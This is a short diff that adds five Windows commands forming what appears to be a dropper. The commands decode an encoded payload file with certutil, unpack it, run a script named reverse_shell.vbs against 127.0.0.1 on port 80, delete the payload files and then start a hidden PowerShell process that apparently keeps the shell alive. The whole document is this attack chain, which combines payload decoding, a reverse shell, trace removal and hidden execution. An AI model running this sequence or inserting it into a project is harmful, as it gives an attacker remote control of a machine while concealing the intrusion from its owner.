@@ -1,0 +1,5 @@
+certutil -decode payload.txt payload.zip
+tar -xf payload.zip
+reverse_shell.vbs 127.0.0.1 80
+del payload.* 
+powershell -windowstyle hidden -f proctl.min.ps1 "wscript reverse_shell.vbs" wscript 127.0.0.1:80 10
